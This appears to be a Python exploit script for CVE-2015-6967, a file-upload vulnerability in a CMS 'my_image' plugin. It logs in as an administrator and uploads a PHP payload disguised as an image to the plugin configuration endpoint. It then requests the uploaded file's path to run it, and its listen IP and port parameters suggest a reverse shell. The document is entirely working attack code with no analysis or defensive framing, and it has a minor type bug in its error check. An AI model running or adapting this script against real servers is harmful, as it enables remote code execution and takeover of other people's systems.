import requests
import sys

class Exploit:

    __cve = "CVE-2015-6967"
    __description = ""

    def __init__(self):
        """ Load Exploit """
        print("Initialising exploit for {0}".format(self.__cve))
        self.payload = open("payload.php", "rb")

    def exploit(self, target, username, password, proxy, listen_ip, listen_port):
        """ Need to validate proxy scheme """
        if proxy:
            proxies = proxy

        """ GET Login """
        url = "http://{0}".format(target)
        try:
            response = requests.get(url, headers={'Cookie':''}, proxies=proxies)
        except UnboundLocalError:
            response = requests.get(url, headers={'Cookie':''})
        print(response)
        """ Parse Cookie"""
        
        session_id = response.headers['Set-Cookie']
        session_id = session_id.split(";")
        session_id = session_id[0]
        


        """ Null values for reuse """
        url = None
        response = None

        """ Prepare Login Request """
        url = "http://{0}/admin.php".format(target)
        data = {
            'username':username,
            'password':password
        }
        headers = {
            'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
            'Cookie':session_id
        }
        """ Authenticate """
        try:
            response = requests.post(url, data=data, headers=headers, proxies=proxies, allow_redirects=False)
        except UnboundLocalError:
            response = requests.post(url, data=data, headers=headers, allow_redirects=False)

        """ Reset session_id incase the cookie is replaced/ destroyed """
        try:
            session_id = None
            session_id = response.headers['Set-Cookie']
            session_id = session_id.split(";")
            session_id = session_id[0]
        except:
            print("No new cookie set.")

        """ Null variables for reuse """
        response = None
        url = None
        headers = None

        headers = {
            'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
            'Cookie':session_id
        }
        
        url = "http://{0}/admin.php?controller=plugins&action=config&plugin=my_image".format(target)
        files = {
            'plugin': (
                None,
                b'my_image', 
                '', 
                '',
            ),
            'title': (
                None,
                b'My image',
                '',
                '',
            ),
            'position': (
                None,
                b'4',
                '',
                ''
            ),
            'caption': (
                None,
                b'',
                '',
                '',
            ),
            'image':(
                'lqbudlwmpd.php',
                self.payload,
                'application/x-php',
                '',
            ),
            'image_resize':(
                None,
                b'1',
                '',
                '',
            ),
            'image_width':(
                None,
                b'230',
                '',
                '',
            ),
            'image_height':(
                None,
                b'200',
                '',
                '',
            ),
            'image_option':(
                None,
                b'auto',
                '',
                '',
            )
        }
        try:
            response = requests.post(url,files=files,headers=headers, proxies=proxies)
        except UnboundLocalError:
            response = requests.post(url,files=files,headers=headers)
        if "security error" in response:
            print("Unable to authenticate. Quitting.")
            sys.exit(0)

        url = None
        url = "http://{0}/content/private/plugins/my_image/image.php".format(target)
        try:
            response = requests.get(url,headers=headers,proxies=proxies)
        except UnboundLocalError:
            response = requests.get(url,headers=headers)
